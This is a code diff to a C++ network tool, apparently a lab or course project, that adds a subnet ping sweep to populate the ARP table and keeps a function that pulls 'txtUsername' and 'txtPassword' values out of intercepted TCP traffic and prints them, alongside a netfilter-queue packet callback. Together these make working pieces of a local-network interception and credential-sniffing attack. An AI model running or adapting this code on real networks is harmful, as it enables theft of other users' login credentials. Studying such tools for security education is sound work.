@@ -149,6 +149,34 @@ void get_interface_info() {
     return;
 }
 
+void update_arp_table() {
+    string command = "ip addr show " + string(dev_name);
+    string buffer  = execCommand(command.c_str());
+
+    int ip_start = buffer.find("inet ") + 5;
+    int ip_end   = buffer.find("/", ip_start);
+    int mask_end = buffer.find(" ", ip_end);
+
+    string ip_str   = buffer.substr(ip_start, ip_end - ip_start);
+    string mask_str = buffer.substr(ip_end + 1, mask_end - (ip_end + 1));
+    struct in_addr addr;
+    inet_aton(ip_str.c_str(), &addr);
+
+    int mask    = atoi(mask_str.c_str());
+    addr.s_addr = (addr.s_addr << (32 - mask)) >> (32 - mask);
+    string current_ip(inet_ntoa(addr));
+
+    int n = 1 << (32 - mask);
+    for (int i = 0; i < n; ++i) {
+        command = "ping -c 1 -i 0.01 " + current_ip + " > /dev/null 2>&1 &";
+        system(command.c_str());
+        addr.s_addr = htonl(addr.s_addr);
+        addr.s_addr++;
+        addr.s_addr = ntohl(addr.s_addr);
+        current_ip = string(inet_ntoa(addr));
+    }
+}
+
 void read_arp_table() {
     FILE* arp_file = fopen("/proc/net/arp", "r");
 
@@ -175,6 +203,7 @@ void read_arp_table() {
 void task1() {
     get_defaultgw();
     get_interface_info();
+    update_arp_table();
     read_arp_table();
 
     cout << "Available devices\n------------------------------------\nIP                 MAC\n";
@@ -312,15 +341,15 @@ uint16_t calculate_udp_checksum(const uint8_t *buf, size_t len, uint32_t src_ip,
 
 void parse_TCP(char* buffer) {
     struct tcphdr* tcphdr = (struct tcphdr*)buffer;
-    std::string payload(buffer + 4 * tcphdr->doff);
+    string payload(buffer + 4 * tcphdr->doff);
     int uname = payload.find("txtUsername");
     int upwd = payload.find("txtPassword");
     int upwd_end = payload.find("\r\n", upwd);
-    if (uname == (int)std::string::npos || upwd == (int)std::string::npos)
+    if (uname == (int)string::npos || upwd == (int)string::npos)
         return;
-    std::cout << '\n';
-    std::cout << "Username: " << payload.substr(uname + 12, upwd - 1 - (uname + 12)) << '\n';
-    std::cout << "Password: " << payload.substr(upwd + 12, upwd_end - (upwd + 12)) << '\n';
+    cout << '\n';
+    cout << "Username: " << payload.substr(uname + 12, upwd - 1 - (uname + 12)) << '\n';
+    cout << "Password: " << payload.substr(upwd + 12, upwd_end - (upwd + 12)) << '\n';
 }
 
 static int cb(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, void *buf) {
